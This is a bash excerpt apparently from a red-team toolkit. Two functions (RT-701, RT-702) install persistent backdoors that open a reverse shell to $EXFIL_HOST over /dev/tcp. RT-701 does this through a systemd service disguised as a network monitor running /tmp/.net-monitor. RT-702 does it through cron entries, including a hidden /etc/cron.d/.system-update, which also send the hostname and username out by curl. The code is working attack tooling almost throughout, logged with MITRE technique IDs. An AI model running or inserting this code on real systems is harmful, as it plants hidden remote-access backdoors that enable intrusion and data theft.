rt_701_systemd_service_persistence() {
    rt_banner "RT-701" "Systemd Service Persistence"
    local REV
    REV='#!/bin/bash\nwhile true; do bash -i >& /dev/tcp/'"$EXFIL_HOST"'/'"$EXFIL_PORT"' 0>&1 2>/dev/null || true; sleep 60; done'
    if [[ "$(id -u)" == "0" ]]; then
        echo -e "    $RED[+] Root detected — installing systemd persistence$NC"
        printf '%s\n' "$REV" > /tmp/.net-monitor 2>/dev/null && chmod +x /tmp/.net-monitor
        cat > /etc/systemd/system/systemd-network-check.service 2>/dev/null << UNIT
[Unit]
Description=Network Connectivity Monitor
After=network.target
[Service]
Type=simple
ExecStart=/tmp/.net-monitor
Restart=always
RestartSec=30
[Install]
WantedBy=multi-user.target
UNIT
        systemctl daemon-reload 2>/dev/null
        systemctl enable systemd-network-check 2>/dev/null
        echo -e "    $GREEN[+] Systemd persistence installed$NC"
        add_vuln "RT-701" "CRITICAL" "Systemd Persistence" "Systemd backdoor installed at /etc/systemd/system/" "persistence" "full" "MITRE T1543.002"
    else
        mkdir -p "$HOME/.config/systemd/user" 2>/dev/null
        printf '%s\n' "$REV" > /tmp/.net-monitor 2>/dev/null && chmod +x /tmp/.net-monitor
        cat > "$HOME/.config/systemd/user/systemd-network-check.service" 2>/dev/null << UNIT
[Unit]
Description=Network Monitor
[Service]
Type=simple
ExecStart=/tmp/.net-monitor
Restart=always
[Install]
WantedBy=default.target
UNIT
        systemctl --user daemon-reload 2>/dev/null
        systemctl --user enable systemd-network-check 2>/dev/null
        echo -e "    $GREEN[+] User systemd persistence installed$NC"
        add_vuln "RT-701" "HIGH" "User Systemd Persistence" "User systemd backdoor installed" "persistence" "user" "MITRE T1543.002"
    fi
}

rt_702_cron_persistence_polymorphic() {
    rt_banner "RT-702" "Cron Polymorphic Persistence"
    local RAND_MIN=$((RANDOM % 60))
    local RAND_HOUR=$((RANDOM % 24))
    local CRON_ENTRY="$RAND_MIN $RAND_HOUR * * * bash -c 'bash -i >& /dev/tcp/$EXFIL_HOST/$EXFIL_PORT 0>&1 2>/dev/null || curl -sk -X POST https://$EXFIL_HOST:$EXFIL_PORT/c -d \"h=$(hostname)\&u=$(whoami)\" --connect-timeout 3 2>/dev/null'"
    local INSTALLED=0
    local CRON_PATHS=("/etc/crontab" "/var/spool/cron/root" "/var/spool/cron/crontabs/root")
    for cp in "${CRON_PATHS[@]}"; do
        if [[ -w "$cp" ]] 2>/dev/null || [[ -w "$(dirname "$cp")" ]] 2>/dev/null; then
            echo "$CRON_ENTRY" >> "$cp" 2>/dev/null && INSTALLED=1 && echo -e "    $GREEN[+] Cron persistence at $cp$NC"
        fi
    done
    if command -v crontab &>/dev/null; then
        (crontab -l 2>/dev/null; echo "$CRON_ENTRY") | crontab - 2>/dev/null && INSTALLED=1 && echo -e "    $GREEN[+] User crontab persistence$NC"
    fi
    if [[ -d /etc/cron.d ]]; then
        echo "$CRON_ENTRY" > /etc/cron.d/.system-update 2>/dev/null && chmod 644 /etc/cron.d/.system-update 2>/dev/null && INSTALLED=1 && echo -e "    $GREEN[+] Hidden cron.d persistence$NC"
    fi
    if [[ "$INSTALLED" == "1" ]]; then
        add_vuln "RT-702" "CRITICAL" "Cron Persistence" "Polymorphic cron backdoor installed" "persistence" "full" "MITRE T1053.003"
    else
        echo -e "    $YELLOW[-] Could not write cron$NC"
    fi
}

